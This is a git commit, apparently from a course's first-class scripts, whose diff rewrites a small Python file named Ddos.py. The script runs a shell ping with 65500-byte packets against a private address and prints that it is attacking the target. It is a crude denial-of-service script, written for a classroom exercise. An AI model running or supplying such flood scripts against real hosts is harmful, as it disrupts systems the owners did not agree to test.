a1af84dcbbdb6df4de0bffe8bba72a25e9891180
Giovanni Della Dea <91167613+giossaurus@users.noreply.github.com>
2025-03-11 22:17:50 -0300

    scripts de teste da ultima aula

--- scripts_aula01/Ddos.py
+++ scripts_aula01/Ddos.py
@@ -2,10 +2,10 @@ import os
 import sys
 import time
 
-def icmp_startatack():
-    hostip: “192.168.1.104”
-    ippacketData = “65500”
-    print “Attacking the target with crafted icmp packets”
-    os.system(“ping ” + hostip + “ -l ” + ippacketData)
-icmp_startattack()
-print “attack finished”
+def icmp_start_attack():
+    host_ip = "192.168.1.104"
+    ip_packet_data = "65500"
+    print("Attacking the target with crafted icmp packets")
+    os.system("ping " + host_ip + " -l " + ip_packet_data)
+icmp_start_attack()
+print("attack finished")
